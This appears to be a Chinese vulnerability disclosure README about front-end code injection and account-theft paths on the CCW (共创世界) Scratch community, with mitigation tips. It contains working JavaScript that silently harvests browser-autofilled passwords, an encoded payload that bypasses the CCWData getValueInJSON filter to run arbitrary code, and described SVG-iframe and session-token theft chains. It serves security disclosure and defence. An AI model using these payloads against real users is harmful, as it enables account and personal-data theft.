记录共创世界的前端代码注入漏洞和可能的盗号方式。

更新时间：北京时间 2026 年 5 月 10 日 20:29

> [!WARNING]  
> **仅供学习研究用途，请勿用于网络攻击，违者后果自负！！！**  
>
> **For learning and research purposes only. Do not use for cyber attacks. Offenders will bear all the consequences!!!**

> [!TIP]  
> 建议使用 [CCW-Code-Injection-Risk-Warning](https://github.com/bddjr/CCW-Code-Injection-Risk-Warning) 防御部分漏洞。  

---

## 自动填充账号密码

这本该是浏览器的问题。  
如果用户没有更改浏览器的相关设置，只要 `<input>` 元素没有填写错误的 autocomplete 属性，浏览器就会自动填充已保存的账号密码，没有经过使用者的许可。  

攻击者成功注入恶意代码之后，可以盗取浏览器自动填充的账号密码，即使网页未显示输入框。  

> 但是，为什么 CCW 的登录界面不会自动填充密码？  
> 那是因为 CCW 的登录界面的 password 输入框的 autocomplete 属性填的是 "new-password" 。  

参考 https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Attributes/autocomplete

盗号程序演示：

> [!WARNING]  
> **仅用于测试自己的环境的安全性，不得用于盗取他人账号，违者后果自负！！！**  
>
> **For testing the security of your own environment only. Do not use it to steal others' accounts. Offenders will bear all the consequences!!!**  

```js
// 在浏览器的控制台粘贴代码，然后按键盘上的 enter 。
// 返回类型 { id: string, password: string } 。
// 如果返回的 id 和 password 都是空字符串，说明浏览器没有自动填充密码。
await new Promise((resolve, reject) => {
    var form, timeoutId;
    function removeElement() {
        try { if (form) form.remove() } catch (e) { }
    }
    function clearMyTimeout() {
        try { if (timeoutId) clearTimeout(timeoutId) } catch (e) { }
    }
    try {
        form = document.createElement('form');
        form.style.display = 'none';
        form.innerHTML = (
            `<input type=text name=id autocomplete=username>` +
            `<input type=password name=password autocomplete=current-password>`
        );
        function res() {
            try {
                const out = Object.fromEntries(new FormData(form));
                removeElement();
                resolve(out);
            } catch (e) {
                removeElement();
                reject(e);
            }
        }
        function oninput() {
            if (form.lastChild.value && form.firstChild.value) {
                clearMyTimeout();
                res();
            }
        }
        form.firstChild.addEventListener('input', oninput)
        form.lastChild.addEventListener('input', oninput)
        document.body.appendChild(form);
        // 3 秒没填充就自动返回
        timeoutId = setTimeout(res, 3000);
    } catch (e) {
        removeElement();
        clearMyTimeout();
        reject(e);
    }
})
```

> [!TIP]  
> 建议禁用浏览器的自动填充密码，或者改为 “在查看或填写网站密码之前提示设备登录选项。始终征求许可”  
> 
> ![3](./img/3.png)  

---

## SVG

### 基于 Scratch 编辑器编辑造型的代码注入攻击：  
参考 https://muffin.ink/blog/scratch-vulnerability-disclosure/  
漏洞演示 https://www.ccw.site/detail/69f73e772a7d36316189ef73  

### 基于 iframe + svg 的代码注入攻击：  
⚡立即中招，几乎没有反应时间。  
如果在浏览器里直接用一个标签页打开 svg ，浏览器会执行 svg 里的 JS 脚本。同理，在没有保护措施的 iframe 里加载 svg 也会立即执行脚本。  
漏洞演示：https://m.ccw.site/user_projects_assets/a8039314e7b97ea48e176b34090b680e.svg  
已知登录 www.ccw.site 时的 Set-Cookie 响应头是这样的
```
Set-Cookie: token=XXXXXXXXXXXXXXXX60816ba55659e776ec2d3be9; Path=/; Domain=.ccw.site; Max-Age=2592000; Expires=Tue, 02 Jun 2026 12:57:16 GMT; HttpOnly
```
因此，在 m.ccw.site 加载的 svg 里执行的脚本可以携带有效的 token 请求 CCW 接口。  
设想的场景：  
黑客在 learn.ccw.site 使用 iframe 嵌入来自 m.ccw.site 的 svg ，然后这个 svg 里有恶意代码，并且会伪装，表面上看这好像就是个 iframe 在显示b站的视频，背后其实已经把浏览器自动填充的密码、手机号、实名认证的姓名、身份证前两位和后两位等信息打包并发送到黑客的服务器了。  
这比加载 Gandi IDE 再执行恶意脚本还要快很多很多倍，受害者根本来不及反应。  

![0](./img/0.png)

![1](./img/1.png)

![2](./img/2.png)

> [!TIP]  
> 建议根据按照以下步骤操作，增强安全性：
>
>  - 如果您使用 Google Chrome 浏览器：  
>    访问 https://m.ccw.site ，然后点击网址左侧的按钮，然后点击“网站设置”，然后将“JavaScript”权限改为“阻止”。  
>
>  - 如果您使用 Microsoft Edge 浏览器：  
>    访问 https://m.ccw.site ，然后点击网址左侧的🔒按钮，然后点击“此网站的权限”，然后将“JavaScript”权限改为“阻止”。  
>
>  - 如果您使用 Mozilla Firefox 浏览器：  
>    无法禁用网站的 JavaScript 权限，建议更换浏览器。  

如果 CCW 官方需要防止浏览器访问 m.ccw.site 的时候执行脚本，只需要添加以下响应头，阻止执行任何脚本：  
```
Content-Security-Policy: script-src 'none';
```

---

## CCWData

扩展显示名称：Gandi云数据

该扩展有代码注入漏洞，且官方从未真正修复它，而是将它们标记为 `（❌过时的积木）` ，然后隐藏起来，因此仍然可以被利用，且不会触发任何警告。  

2026 年 3 月 9 日，官方修改了代码注入漏洞积木的逻辑，但并没有修复漏洞，攻击者仍然能拿到全局 `window` 对象，仍然可以[从 React 提取 scratch-vm](https://github.com/bddjr/getScratchVMFromReact) 。

如果您需要回滚到修改前的行为，请用 https://github.com/bddjr/CCWData-polyfill-eval 。

如果您想看旧版逻辑，请看 [before-20260309.md](before-20260309.md) 。

参考逆向代码文件 [20260309.scratch3_ccw_data.e7237e1f.prettyprint.js](20260309.scratch3_ccw_data.e7237e1f.prettyprint.js) 。

### getValueInJSON

```js
{
    key: "getValueInJSON",
    value: function(t) {
        var e, r = u().toString(t.KEY), a = u().toString(t.JSON);
        try {
            e = JSON.parse(a)
        } catch (t) {
            return "error: ".concat(t.message)
        }
        if (/[()=]/gm.test(r))
            return "error: invalid key ".concat(r, ", cannot contain ()=");
        var n, o = "jsonObj[".concat(r, "]");
        Array.isArray(e) ? r = r.startsWith("[") ? "jsonObj".concat(r) : "jsonObj[".concat(r, "]") : /\s/gm.test(r) ? (console.warn("[CCW Data] warning: invalid key ".concat(r, ", space and dot cannot be used together")),
        r = 'jsonObj["'.concat(r, '"]')) : r = "jsonObj.".concat(r);
        try {
            n = (0,
            y.Br)("return ".concat(r), {
                jsonObj: e
            })
        } catch (t) {
            try {
                n = (0,
                y.Br)("return ".concat(o), {
                    jsonObj: e
                })
            } catch (t) {
                return "error: key or expression invalid"
            }
        }
        return "object" === g(n) ? JSON.stringify(n) : n
    }
}
```

乍一看好像没啥问题，把 `key` 的 `()=` 这几个符号都过滤掉了，看起来好像没办法执行什么函数了……吗？  

ECMAScript 2015 新增了模板字符串功能，模板字符串可以执行函数，例如：

```js
String.raw`C:\Development\profile\aboutme.html`
```

经过我的研究，因为它输入给函数的参数0是一个数组，所以它不能直接调用 `eval` 执行字符串，  
但它可以调用 `Function` 以创建函数，然后执行函数。

```js
toString.constructor`window.Function=toString.constructor;var msg='注入代码测试';console.log(msg,arguments)``${jsonObj}`
```

只需要将字符串里的部分字符按照以下形式替换，就能绕过正则表达式的过滤：

> `(` -> `\x28`  
> `)` -> `\x29`  
> `=` -> `\x3d`  
> ` ` -> `\x20`  

于是我们就得到了：

```js
toString.constructor`window.Function\x3dtoString.constructor;var\x20msg\x3d'注入代码测试';console.log\x28msg,arguments\x29``${jsonObj}`
```

将这行代码填入 `args.KEY` 里，就可以执行想要的操作了。

当然了，返回值的类型仍受限制，您可以尝试重写 `JSON.stringify` 以返回对象。  

```js
window.Function = toString.constructor;
const jsonObj = arguments[1];
// 返回 rtObj 对象
const rtObj = {
    jsonObj,
    "114": "514"
};
const { stringify } = JSON;
JSON.stringify = function(o) {
    return o === rtObj ? (JSON.stringify = stringify, o) : stringify.apply(this, arguments)
};
return rtObj
```

```js
toString.constructor`window.Function\x3dtoString.constructor;const\x20jsonObj\x3darguments[1];const\x20rtObj\x3d{jsonObj,"114":"514"};const{stringify}\x3dJSON;JSON.stringify\x3dfunction\x28o\x29{return\x20o\x3d\x3d\x3drtObj?\x28JSON.stringify\x3dstringify,o\x29:stringify.apply\x28this,arguments\x29};return\x20rtObj``${jsonObj}`
```

以上代码配合 “当计时器 > -1” 的帽子，就可以在浏览器访问 creator 或 gandi 页面的链接后立即执行任意代码，或者在其它页面点击“立即运行”时立即执行任意代码。

### setValueInJSON

```js
{
    key: "setValueInJSON",
    value: function(t) {
        var e, r = u().toString(t.KEY), a = u().toString(t.VALUE), n = u().toString(t.JSON);
        try {
            e = JSON.parse(n)
        } catch (t) {
            return "error: ".concat(t.message)
        }
        if (/[()=]/gm.test(r))
            return "error: invalid key ".concat(r, ", cannot contain ()=");
        var o = a;
        if (/^[\[].*?[\]]$/gm.test(a) || /^[\{].*?[\}]$/gm.test(a))
            try {
                o = JSON.parse(a)
            } catch (t) {}
        "string" == typeof o && /^-?\d*\.?\d*$/gm.test(o) && (o = Number(o));
        try {
            Array.isArray(e) ? e[r] = o : /[\.\[\]]/gm.test(r) ? (0,
            y.Br)("jsonObj.".concat(r, " = valueObj;"), {
                jsonObj: e,
                valueObj: o
            }) : e[r] = o
        } catch (t) {
            return "error: key or expression invalid"
        }
        return JSON.stringify(e)
    }
}
```

从 2026 年 3 月 9 日 起，此处的漏洞和 `getValueInJSON` 的漏洞一致。

---

## 未上架的扩展

未上架的扩展就是第三方的脚本，它并没有运行在沙盒环境里，因此漏洞是十分明显的。

关于它的加载方式，有两种情况。

### detail页面

以前会在加载作品的时候直接执行第三方的脚本，然后才在用户点击 “立即运行” 的时候询问是否运行。  
这样的漏洞是非常明显的，脚本没有经过用户同意，就已经执行。  

现在在加载扩展之前就会警告，只有用户点击 “继续运行” 才会运行扩展的脚本，降低了安全风险。  

### 其它页面

其它页面例如：
> creator  
> gandi  
> embed

这些页面在加载项目的时候会立即加载并执行扩展脚本，不会经过用户同意，因此漏洞仍然明显。

攻击者可以利用 creator 或 gandi 会立即加载作品的特性，在加载作品的时候执行第三方扩展脚本。  
用户只需要访问创作页的链接，就会将自己的账号暴露在风险之中。  

对应的，在创作者学院的文章里，可以插入 iframe ，而 iframe 能立即访问 creator 或 gandi ，形成了漏洞链，用户仅需点开文章，就会暴露在风险之中。  

当然了，创作页执行上述操作，并不需要使用第三方扩展，只需要使用 CCWData 的代码注入漏洞，配合 “当计时器 > -1” 的帽子，就可以在浏览器访问链接后立即执行任意代码。

（iframe + Gandi 加载太慢了，不如用 iframe + svg）

---

## list_sessions接口

```
POST https://community-web.ccw.site/students/list_sessions?page=1&perPage=20&sortField=createdAt&sortType=DESC
```

这个接口的漏洞十分明显，攻击者只需要知道如何借助心跳接口获取 HmacMD5 的 key ，就可以搞定 A 请求头和 B 请求头，然后请求这个接口，获取当前用户的 token ，从而盗号。  
配合代码注入漏洞，形成漏洞攻击链。

CSense 的作者曾多次强调 CSense 无法盗取用户的密码，却隐瞒了这一事实。  
早期 CSense 利用该漏洞，将 CSense 使用者的登录信息和 token 发送给 CSense 的作者。

该漏洞在 2026 年 1 月 16 日 被修复，攻击者不能再借助该接口获取 token ，但仍可以获取登录时的时间、IP地址、浏览器版本，问题不大。

---

## login接口

```
POST https://sso.ccw.site/web/auth/login-by-password
```

该接口会在用户登录时响应的 json 里暴露当前的 token ，但它不会被存储到本地。  

攻击者只能在用户登录的时候获取它，而且只能获取当前会话的 token 。  

但既然用户都在这时候登录了，当然可以直接获取用户输入的密码，所以该漏洞的影响有限，仅对于不使用密码登录的人来说会增加风险。  

---

## 官方的承诺

仅供参考，不予置评。  

以下内容节选自《CCW共创世界隐私政策》  

版本更新日期：2021年06月01日  
本政策生效日期：2021年06月01日  

**五.我们如何存储和保护您的个人信息**  
（二）个人信息的保护  
  1. 平台会采取合理可行的措施，尽力避免收集无关的个人信息。平台只会在达成本政策所述目的所需的期限内保留您的个人信息，除非法律有强制的存留要求。在您的个人信息超出保留期间后，平台会根据适用法律的要求删除您的个人信息，或使其匿名化处理。

  2. 我们已通过了公安部信息安全等级保护三级认证，并与监管机构、第三方测评机构建立了良好的协调沟通机制，及时抵御并处置各类信息安全威胁，为您的信息安全提供全方位保障。

  3. 平台已制定个人信息安全事件应急预案，定期组织内部相关人员进行应急响应培训和应急演练，使其掌握岗位职责和应急处置策略和规程。

  4. 如发生个人信息安全事件后，平台将按照法律法规的要求并最迟不迟于 30 个自然日内向您告知：安全事件的基本情况和可能的影响、平台已采取或将要采取的处置措施、您可自主防范和降低风险的建议、对您的补救措施等。事件相关情况平台将以邮件、信函、电话、推送通知等方式告知您，难以逐一告知个人信息主体时，平台会采取合理、有效的方式发布公告。同时，平台还将按照监管部门要求，上报个人信息安全事件的处置情况。

  5. **由于技术的限制以及可能存在的各种恶意手段，在互联网行业，即便竭尽所能加强安全措施，也不可能始终保证信息百分之百的安全，我们将尽力确保您提供给我们的个人信息的安全性。请您知悉并理解，您接入我们的服务所用的系统和通讯网络，有可能因我们可控范围外的因素而出现问题。因此，我们强烈建议您采取积极措施保护个人信息的安全，包括但不限于使用复杂密码、定期修改密码、不将自己的账号密码等个人信息透露给他人。**

---

## 相关文章

- [为什么你的密码会被恶意扩展窃取？](https://learn.ccw.site/article/87737a20-a45d-4d41-b950-1af19dbc1ae7)  
  [往昔余庆](https://www.ccw.site/student/5db279a4483f207ab58b3929) 2026-05-08 02:28  

- [【社区公告】关于“账号安全”的通知](https://learn.ccw.site/article/998d3e07-7210-4b5a-ab6d-64ac84e3caef)  
  [共创世界产品汪](https://www.ccw.site/student/6008f86de6894d53dd63749f) 2026-04-13 19:20  

- [恶意扩展如何让你上钩？远远不止这些……](https://learn.ccw.site/article/5f06747c-fae9-4ed6-b69e-24016eedbfd3)  
  [浅_酱_](https://www.ccw.site/student/63d8837e6bc82a13fb855f0a) 2026-04-11 22:21  

- [[重要通告]保护账号安全，做对这几件事...](https://learn.ccw.site/article/6af308a5-cb78-465c-bb1e-572c48f0fc5e)  
  [鸭鸭院长](https://www.ccw.site/student/61039f14fffbe5461b880787) 2025-12-08 17:09  
